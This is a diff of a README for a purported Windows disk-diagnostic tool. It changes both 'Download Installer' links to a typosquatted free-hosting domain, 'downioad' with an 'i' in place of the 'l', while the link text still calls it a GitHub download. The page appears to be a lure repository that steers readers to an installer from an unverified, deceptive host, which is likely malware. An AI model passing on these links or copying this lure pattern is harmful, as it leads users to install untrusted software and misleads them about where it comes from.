@@ -2,7 +2,7 @@
 
 Hard Drive Diagnostic Tool 2026 is a robust Windows application designed to monitor, test, and analyze the health of your hard drives and SSDs. It provides detailed reports and actionable insights to help you prevent data loss and optimize disk performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -55,4 +55,4 @@ A: Absolutely. The tool performs read-only operations for health checks and diag
 
 For the latest version and official releases, please visit our download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
